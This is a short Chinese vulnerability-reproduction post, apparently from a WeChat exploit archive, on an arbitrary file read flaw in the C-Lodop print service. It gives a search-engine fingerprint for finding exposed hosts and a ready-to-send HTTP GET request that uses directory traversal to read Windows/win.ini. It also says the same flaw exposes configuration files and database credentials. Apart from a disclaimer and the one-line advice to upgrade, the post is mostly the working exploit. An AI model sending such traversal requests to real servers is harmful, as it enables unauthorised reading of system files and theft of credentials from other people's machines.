#  C-Lodop打印服务系统存在任意文件读取漏洞 附POC  
原创 安服仔
                    安服仔  北风漏洞复现文库   2026-04-17 03:11  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何  
直接或者间接的后  
果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
01  
  
—  
  
漏洞名称  
  
# C-Lodop打印服务系统任意文件读取漏洞  
#   
  
02  
  
—  
  
影响版本  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS2aEZqbk6EeLakVycm3ebp5Nflgd9yFEr8uYkQxA1tynibt8TJWSdz6tZ2PfGqyGKCWdPBeZcPeTFIIx3tVJrjRvrm5C9Ez9KWg/640?wx_fmt=png&from=appmsg "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS0yDSfEAJicINAxUgDmIvRiahZvYZcItbhO0Dvldb7KNsj5A1L1JX6XWGkXQ2fJ0jLNQZRqWFOAdpdUFcBbdFBNwbXlnQTSTDPBE/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=0 "")  
  
03  
  
—  
  
漏洞简介  
  
C-Lodop打印服  
务系统是一款功能强大的云打印  
工具，支持通过JavaScript语句实现远程打印，兼容所有浏览器，无需安装插件或APP，客户端零安装  
。  
该漏洞影响泰安梦泰尔软件有限公司的C-Lodop打印服务系统，默认开启的端口可能被用于攻击。  
C-Lodop打印服务系统因未对文件读取操作进行有效限制，攻击者可通过构造特殊URL读取服务器上的任意文件，如系统配置文件、数据库凭据等，可能导致敏感信息泄露。  
  
04  
  
—  
  
资产测绘  
```
body="C-Lodop打印服务系统"
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS3u5tfxibAnVZwOVfk9ZJKhQ0sJhu02G1v6cRo85icxuBD7cEXJsxLmcRVt4OBTlWn9AAAChmIAnBE6KxJqlBXUp7KoS2BkDPVc8/640?wx_fmt=png&from=appmsg "")  
  
  
05  
  
—  
  
漏洞复现  
  
POC  
```
GET /../../../../../../../../../../Windows/win.ini HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Priority: u=0, i
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS3mRjK9I7xFzqReqLL0ldK8Ta4ibDhxAvGWmyiaBactE2ya1beRJWZhUl2rOVERia4L9rhcgBgC3Wb5NiaIrno3DBAVCYSIkODicSUM/640?wx_fmt=png&from=appmsg "")  
  
06  
  
—  
  
修复建议  
  
升级至最新安全版本  
  
  
07  
  
—  
  
往期回顾  
  
  
  
  
  
  
